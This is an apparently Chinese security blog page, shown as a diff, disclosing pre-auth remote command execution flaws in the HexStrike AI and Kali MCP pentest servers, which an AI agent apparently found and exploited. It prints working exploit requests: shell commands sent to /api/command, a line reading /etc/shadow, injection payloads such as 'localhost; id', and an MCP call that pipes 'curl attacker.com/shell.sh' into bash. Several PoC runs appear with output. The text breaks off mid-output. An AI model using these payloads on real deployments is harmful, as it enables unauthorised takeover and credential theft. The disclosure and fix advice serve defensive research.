@@ -1,0 +1,654 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="ai">
+
+
+<meta name="description" content="前言
+在尝试将该MCP集成到的Agent测试其行为时，我发现它用的是SSE方式，看一眼代码就感觉它存在漏洞，于是尝试看AI智能体是否能发现并构造EXP，测试后发现了大量远程命令执行（RCE）漏洞...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    AI渗透工具 Kali &amp; HexStrike 大量RCE 0day漏洞 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="lazyload" referrerpolicy="no-referrer" class="lazyload" data-src="/../k8img/logo.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a target="_blank" rel="noopener" href="https://k8music.github.io"><i class="fa "></i>
+                                Music</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="AI渗透工具 Kali &amp; HexStrike 大量RCE 0day漏洞">
+            
+            AI渗透工具 Kali &amp; HexStrike 大量RCE 0day漏洞
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/ai/">ai</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/ai/" rel="tag">ai</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2026/05/14</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <h1>前言</h1>
+<p>在尝试将该MCP集成到的Agent测试其行为时，我发现它用的是SSE方式，看一眼代码就感觉它存在漏洞，于是尝试看AI智能体是否能发现并构造EXP，测试后发现了大量远程命令执行（RCE）漏洞，风险极高。本文以演示 7 个 RCE 漏洞利用（EXP）为主，但实际情况比这更多：系统中存在大量可被利用的 API 端点，除了 RCE 外，还可实现任意文件读取、文件写入等多种高危漏洞。Kali MCP 与 Hexstrike 两套代码在漏洞点上高度一致，差异仅在工具数量上：一套包含更多模块，一套相对精简。由于公开有一段时间了，我已懒得关注哪一方先行开发，但可以肯定其中一方是在另一方基础上修改而来——两者都同样危险，必须引起重视。</p>
+<h1>HexStrike AI v6.0 - 代码审计报告</h1>
+<h2 id="RCE-漏洞深度分析-MCP协议攻击向量">RCE 漏洞深度分析 (MCP协议攻击向量)</h2>
+<hr>
+<h2 id="一、漏洞概要">一、漏洞概要</h2>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>详情</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>漏洞类型</strong></td>
+<td>Pre-Auth Remote Code Execution (未授权远程代码执行)</td>
+</tr>
+<tr>
+<td><strong>严重级别</strong></td>
+<td>🔴 <strong>CRITICAL (CVSS 10.0)</strong></td>
+</tr>
+<tr>
+<td><strong>影响端点</strong></td>
+<td><code>POST /api/command</code></td>
+</tr>
+<tr>
+<td><strong>认证需求</strong></td>
+<td>❌ <strong>无需认证</strong></td>
+</tr>
+<tr>
+<td><strong>目标版本</strong></td>
+<td>HexStrike AI v6.0</td>
+</tr>
+<tr>
+<td><strong>测试目标</strong></td>
+<td><a target="_blank" rel="noopener" href="http://192.168.18.10:8888">http://192.168.18.10:8888</a></td>
+</tr>
+<tr>
+<td><strong>审计日期</strong></td>
+<td>2026-04-24</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="二、架构分析">二、架构分析</h2>
+<p>HexStrike AI 由两个核心组件构成：</p>
+<h3 id="2-1-hexstrike-server-py-Flask-Web-后端">2.1 hexstrike_server.py (Flask Web 后端)</h3>
+<ul>
+<li>运行在 8888 端口 (debug=True)</li>
+<li>提供 REST API 供安全工具调用</li>
+<li><code>execute_command()</code> 函数使用 <code>subprocess.run(cmd, shell=True)</code> 执行命令</li>
+</ul>
+<h3 id="2-2-hexstrike-mcp-py-FastMCP-客户端">2.2 hexstrike_mcp.py (FastMCP 客户端)</h3>
+<ul>
+<li>基于 FastMCP 框架构建 (PrefectHQ/fastmcp)</li>
+<li>将 100+ 安全工具封装为 MCP (Model Context Protocol) Tools</li>
+<li>通过 HTTP REST API 与 Flask 后端通信</li>
+<li>暴露 <code>execute_command</code> 作为 MCP tool</li>
+</ul>
+<h3 id="2-3-MCP-协议通信流程">2.3 MCP 协议通信流程</h3>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">AI Agent (Claude/GPT)</span><br><span class="line">    │</span><br><span class="line">    │ MCP Protocol (JSON-RPC 2.0 over stdio/HTTP)</span><br><span class="line">    ▼</span><br><span class="line">hexstrike_mcp.py (FastMCP Server)</span><br><span class="line">    │</span><br><span class="line">    │ HTTP POST /api/command {"command":"...", "use_cache":false}</span><br><span class="line">    ▼</span><br><span class="line">hexstrike_server.py (Flask)</span><br><span class="line">    │</span><br><span class="line">    │ subprocess.run(cmd, shell=True)</span><br><span class="line">    ▼</span><br><span class="line">OS Command Execution 🔴 RCE!</span><br></pre></td></tr></tbody></table></figure>
+<hr>
+<h2 id="三、漏洞详情">三、漏洞详情</h2>
+<h3 id="3-1-漏洞-1-主漏洞-api-command-无需认证的RCE">3.1 漏洞 #1 (主漏洞): <code>/api/command</code> 无需认证的RCE</h3>
+<p><strong>位置</strong>: <code>hexstrike_server.py</code> - <code>api_command()</code> 路由</p>
+<p><strong>根本原因</strong>:</p>
+<ul>
+<li><code>/api/command</code> 端点<strong>没有应用 <code>@require_auth</code> 装饰器</strong></li>
+<li>直接调用 <code>execute_command()</code> → <code>subprocess.run(cmd, shell=True)</code></li>
+<li>用户通过 POST body 传入的 <code>command</code> 参数直接作为 shell 命令执行</li>
+</ul>
+<p><strong>攻击载荷</strong>:</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">requests.post(<span class="string">"http://192.168.18.10:8888/api/command"</span>,</span><br><span class="line">    json={<span class="string">"command"</span>: <span class="string">"id; whoami; cat /etc/shadow"</span>, <span class="string">"use_cache"</span>: <span class="literal">False</span>})</span><br></pre></td></tr></tbody></table></figure>
+<p><strong>验证结果</strong>:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uid=1000(kali) gid=1000(kali) groups=...,27(sudo),...</span><br><span class="line">kali</span><br><span class="line">Linux kali 6.12.38+kali-amd64</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="3-2-漏洞-2-api-debug-execute-和-api-debug-eval-Debug模式">3.2 漏洞 #2: <code>/api/debug/execute</code> 和 <code>/api/debug/eval</code> (Debug模式)</h3>
+<p><strong>位置</strong>: <code>hexstrike_server.py</code> line 1414-1436</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/api/debug/execute'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_execute</span>():</span><br><span class="line">    cmd = request.json.get(<span class="string">'command'</span>, <span class="string">''</span>)</span><br><span class="line">    result = subprocess.run(cmd, shell=<span class="literal">True</span>, ...)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/api/debug/eval'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_eval</span>():</span><br><span class="line">    code = request.json.get(<span class="string">'code'</span>, <span class="string">''</span>)</span><br><span class="line">    result = <span class="built_in">eval</span>(code)  <span class="comment"># 直接eval!</span></span><br></pre></td></tr></tbody></table></figure>
+<p><strong>说明</strong>: 目标上这些端点返回404，说明debug路由可能在生产环境被移除。但源代码中存在。</p>
+<h3 id="3-3-漏洞-3-api-scan-命令注入-需认证">3.3 漏洞 #3: <code>/api/scan</code> 命令注入 (需认证)</h3>
+<p><strong>位置</strong>: <code>hexstrike_server.py</code> - <code>scan_target()</code> → <code>run_tool()</code></p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_tool</span>(<span class="params">tool_name, args</span>):</span><br><span class="line">    cmd = [tool_name] + args</span><br><span class="line">    result = subprocess.run(cmd, ...)</span><br></pre></td></tr></tbody></table></figure>
+<p><code>additional_args</code> 参数直接拼接到命令中，存在命令注入。</p>
+<h3 id="3-4-漏洞-4-SSTI-需认证">3.4 漏洞 #4: SSTI (需认证)</h3>
+<p><strong>位置</strong>: <code>hexstrike_server.py</code> - <code>ssti_preview()</code></p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(user_template)  <span class="comment"># SSTI!</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="3-5-漏洞-5-MCP协议层利用">3.5 漏洞 #5: MCP协议层利用</h3>
+<p>FastMCP框架使用JSON-RPC 2.0协议。攻击者可以通过MCP协议的<code>tools/call</code>方法调用<code>execute_command</code> tool:</p>
+<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"jsonrpc"</span><span class="punctuation">:</span> <span class="string">"2.0"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"id"</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"method"</span><span class="punctuation">:</span> <span class="string">"tools/call"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"params"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"execute_command"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"arguments"</span><span class="punctuation">:</span> <span class="punctuation">{</span><span class="attr">"command"</span><span class="punctuation">:</span> <span class="string">"恶意命令"</span><span class="punctuation">,</span> <span class="attr">"use_cache"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">}</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>
+<p>如果MCP服务器以HTTP Streamable模式运行，攻击者可以直接向<code>/mcp</code>端点发送JSON-RPC请求。</p>
+<hr>
+<h2 id="四、攻击面总结">四、攻击面总结</h2>
+<table>
+<thead>
+<tr>
+<th>端点</th>
+<th>方法</th>
+<th>认证</th>
+<th>RCE</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/api/command</code></td>
+<td>POST</td>
+<td>❌ 无</td>
+<td>✅ subprocess.run(shell=True)</td>
+<td>🔴 已确认</td>
+</tr>
+<tr>
+<td><code>/api/debug/execute</code></td>
+<td>POST</td>
+<td>❌ 无</td>
+<td>✅ subprocess.run(shell=True)</td>
+<td>🟡 目标404</td>
+</tr>
+<tr>
+<td><code>/api/debug/eval</code></td>
+<td>POST</td>
+<td>❌ 无</td>
+<td>✅ eval()</td>
+<td>🟡 目标404</td>
+</tr>
+<tr>
+<td><code>/api/tools/*</code></td>
+<td>POST</td>
+<td>❌ 无?</td>
+<td>✅ 命令注入</td>
+<td>🟡 待验证</td>
+</tr>
+<tr>
+<td><code>/api/ssti-preview</code></td>
+<td>POST</td>
+<td>✅ 需要</td>
+<td>✅ SSTI</td>
+<td>🟢 需认证</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="五、MCP协议RCE攻击链">五、MCP协议RCE攻击链</h2>
+<h3 id="5-1-FastMCP-JSON-RPC-工具调用机制">5.1 FastMCP JSON-RPC 工具调用机制</h3>
+<p>FastMCP (PrefectHQ/fastmcp) 是MCP协议的Python实现。其核心机制：</p>
+<ol>
+<li><strong>工具注册</strong>: <code>@mcp.tool()</code> 装饰器将Python函数注册为MCP tool</li>
+<li><strong>JSON-RPC路由</strong>: <code>tools/call</code> 方法接收 <code>{name, arguments}</code> 并调用对应函数</li>
+<li><strong>传输层</strong>: 支持 stdio / HTTP Streamable / SSE</li>
+</ol>
+<h3 id="5-2-HexStrike中的MCP工具映射">5.2 HexStrike中的MCP工具映射</h3>
+<p><code>hexstrike_mcp.py</code> 中注册的 <code>execute_command</code> 工具：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@mcp.tool()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">command: <span class="built_in">str</span>, use_cache: <span class="built_in">bool</span> = <span class="literal">True</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]:</span><br><span class="line">    result = hexstrike_client.execute_command(command, use_cache)</span><br><span class="line">    <span class="comment"># → POST /api/command {"command": command, "use_cache": use_cache}</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="5-3-通过MCP协议触发RCE">5.3 通过MCP协议触发RCE</h3>
+<p>如果MCP服务器以HTTP模式运行：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接向MCP端点发送JSON-RPC调用</span></span><br><span class="line">curl -X POST http://target:8888/mcp \</span><br><span class="line">  -H <span class="string">"Content-Type: application/json"</span> \</span><br><span class="line">  -d <span class="string">'{</span></span><br><span class="line"><span class="string">    "jsonrpc":"2.0",</span></span><br><span class="line"><span class="string">    "id":1,</span></span><br><span class="line"><span class="string">    "method":"tools/call",</span></span><br><span class="line"><span class="string">    "params":{</span></span><br><span class="line"><span class="string">      "name":"execute_command",</span></span><br><span class="line"><span class="string">      "arguments":{"command":"curl attacker.com/shell.sh|bash"}</span></span><br><span class="line"><span class="string">    }</span></span><br><span class="line"><span class="string">  }'</span></span><br></pre></td></tr></tbody></table></figure>
+<p>或者，如果MCP客户端被配置为AI Agent的工具（如Claude Desktop配置）：</p>
+<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"mcpServers"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"hexstrike-ai"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"command"</span><span class="punctuation">:</span> <span class="string">"python3"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"args"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">"hexstrike_mcp.py"</span><span class="punctuation">,</span> <span class="string">"--server"</span><span class="punctuation">,</span> <span class="string">"http://192.168.18.10:8888"</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>
+<p>AI Agent可以通过MCP协议直接调用<code>execute_command</code>，实现远程命令执行。</p>
+<hr>
+<h2 id="六、修复建议">六、修复建议</h2>
+<h3 id="6-1-紧急修复-P0">6.1 紧急修复 (P0)</h3>
+<ol>
+<li><strong>立即为 <code>/api/command</code> 添加认证</strong>: 应用 <code>@require_auth</code> 装饰器</li>
+<li><strong>移除或禁用 <code>/api/debug/execute</code> 和 <code>/api/debug/eval</code></strong>: 仅开发环境启用</li>
+<li><strong>关闭 Flask debug 模式</strong>: <code>app.run(debug=False)</code></li>
+</ol>
+<h3 id="6-2-深度修复-P1">6.2 深度修复 (P1)</h3>
+<ol start="4">
+<li><strong>使用白名单替代 shell=True</strong>:<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ❌ 危险</span></span><br><span class="line">subprocess.run(cmd, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># ✅ 安全</span></span><br><span class="line">subprocess.run([<span class="string">"/usr/bin/nmap"</span>, <span class="string">"-sV"</span>, target])</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><strong>输入验证和净化</strong>: 对所有用户输入进行严格验证</li>
+<li><strong>最小权限原则</strong>: 以非root用户运行服务，限制网络访问</li>
+</ol>
+<h3 id="6-3-架构改进-P2">6.3 架构改进 (P2)</h3>
+<ol start="7">
+<li><strong>MCP工具权限分离</strong>: <code>execute_command</code> 功能应完全移除或严格限制</li>
+<li><strong>审计日志</strong>: 记录所有命令执行请求</li>
+<li><strong>沙箱</strong>: 在容器或沙箱中执行安全工具</li>
+</ol>
+<hr>
+<h2 id="七、漏洞利用POC">七、漏洞利用POC</h2>
+<p>已保存至:</p>
+<ul>
+<li><code>E:\tools\Ladon12\AIcode\hexstrike_rce_exploit.py</code> - 完整交互式RCE利用</li>
+<li><code>E:\tools\Ladon12\AIcode\rce_test.py</code> - 快速验证脚本</li>
+<li><code>E:\tools\Ladon12\AIcode\rce_full_exploit.py</code> - 深度侦察脚本</li>
+</ul>
+<h3 id="快速验证">快速验证:</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://192.168.18.10:8888/api/command \</span><br><span class="line">  -H <span class="string">"Content-Type: application/json"</span> \</span><br><span class="line">  -d <span class="string">'{"command":"id","use_cache":false}'</span></span><br></pre></td></tr></tbody></table></figure>
+<hr>
+<h2 id="八、目标环境信息-已获取">八、目标环境信息 (已获取)</h2>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Kali GNU/Linux Rolling 2025.3</td>
+</tr>
+<tr>
+<td>内核</td>
+<td>Linux 6.12.38+kali-amd64</td>
+</tr>
+<tr>
+<td>当前用户</td>
+<td>kali (uid=1000)</td>
+</tr>
+<tr>
+<td>用户组</td>
+<td>kali, adm, <strong>sudo</strong>, wireshark 等</td>
+</tr>
+<tr>
+<td>工作目录</td>
+<td>/home/kali/Desktop/hexstrike-ai</td>
+</tr>
+<tr>
+<td>内网IP</td>
+<td>192.168.18.10/24</td>
+</tr>
+<tr>
+<td>Meta接口</td>
+<td>198.18.0.1/30</td>
+</tr>
+<tr>
+<td>运行进程</td>
+<td>python3 (hexstrike_server.py) PID 140418</td>
+</tr>
+<tr>
+<td>其他服务</td>
+<td>clash-verge:33331, proxy:7897, :8000</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<p><strong>审计结论</strong>: HexStrike AI v6.0 存在严重的预认证RCE漏洞。<code>/api/command</code> 端点未受保护，允许攻击者以 <code>kali</code> 用户身份执行任意系统命令。该用户属于 <code>sudo</code> 组，可进一步提权至root。建议立即修复。</p>
+<h2 id="九、hexstrike-0day漏洞Exp图文演示">九、hexstrike 0day漏洞Exp图文演示</h2>
+<p>本文仅演示7个远程命令执行EXP，实际上还有大量API端点存在RCE漏洞,不只是RCE，任意文件读取，文件写入等等大量漏洞</p>
+<p><img alt="image" class="lazyload" data-src="/k8img/ai/mcp/hexstrike/3.1_try_isok.png"></p>
+<p>示例：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py http://192.168.18.10:8888 <span class="built_in">id</span></span><br></pre></td></tr></tbody></table></figure>
+<p>这个 POC 清楚地演示了漏洞，并提供了一种可靠的方法来在目标系统上执行任意命令。审计任务完成。</p>
+<p><img alt="image" class="lazyload" data-src="/k8img/ai/mcp/hexstrike/api_comond.png"></p>
+<p>Coder2 : Ladon_code_save<br>
+已完成</p>
+<p>任务完成。我已成功挖掘出 hexstrike 项目中的远程代码执行（RCE）漏洞，并提供了一个功能完整的、可用于演示的 <a target="_blank" rel="noopener" href="http://poc.py">poc.py</a> 脚本。</p>
+<p>漏洞概要:</p>
+<p>漏洞类型: 远程代码执行 (RCE)<br>
+漏洞根源: hexstrike_server.py 在处理来自客户端 (hexstrike_mcp.py) 的请求时，存在一个未记录的、不安全的 API 端点。<br>
+利用向量: 向 http://&lt;target_ip&gt;:<port>/api/command 发送一个包含要执行命令的 JSON payload 的 POST 请求。<br>
+影响: 攻击者可以在运行 hexstrike_server.py 的服务器上以应用程序的权限执行任意系统命令。</port></p>
+<p>0x002  subdomain端点漏洞EXP</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">E:\tools\Ladon12\AIcode&gt;python hexstrike_subdomain_poc.py http://192.168.18.10:8888 <span class="built_in">id</span></span><br><span class="line">[+] POC Target Endpoint: http://192.168.18.10:8888/api/tools/subfinder</span><br><span class="line">[+] Injecting Payload: {<span class="string">"domain"</span>: <span class="string">"example.com; id #"</span>}</span><br><span class="line">[+] Request returned with Status Code: 200</span><br><span class="line"></span><br><span class="line">[+] Command Output:</span><br><span class="line">----------------------------------------</span><br><span class="line">{</span><br><span class="line">  <span class="string">"execution_time"</span>: 0.023524999618530273,</span><br><span class="line">  <span class="string">"partial_results"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">"return_code"</span>: 0,</span><br><span class="line">  <span class="string">"stderr"</span>: <span class="string">"/bin/sh: 1: subfinder: not found\n"</span>,</span><br><span class="line">  <span class="string">"stdout"</span>: <span class="string">"uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer)\n"</span>,</span><br><span class="line">  <span class="string">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">"timed_out"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">"timestamp"</span>: <span class="string">"2026-04-24T15:16:08.218494"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">[SUCCESS] Command output successfully detected <span class="keyword">in</span> the response!</span><br><span class="line">----------------------------------------</span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="image" class="lazyload" data-src="/k8img/ai/mcp/hexstrike/api_subdomain.png"></p>
+<p>0x003  nmap端点RCE漏洞EXP</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python hexstrike_nmap_args_rce_poc_v2.py http://192.168.18.10:8888 <span class="string">"id"</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="image" class="lazyload" data-src="/k8img/ai/mcp/hexstrike/api_nmap.png"></p>
+<p>0x004 wafw00f端点RCE漏洞EXP</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">E:\tools\Ladon12\AIcode&gt;python poc_wafw00f_rce.py http://192.168.18.10:8888 <span class="built_in">id</span></span><br><span class="line">[+] POC Target Endpoint: http://192.168.18.10:8888/api/tools/wafw00f</span><br><span class="line">[+] Injecting Payload: {<span class="string">"target"</span>: <span class="string">"localhost; id"</span>, <span class="string">"additional_args"</span>: <span class="string">""</span>}</span><br><span class="line">[+] Request returned with Status Code: 200</span><br><span 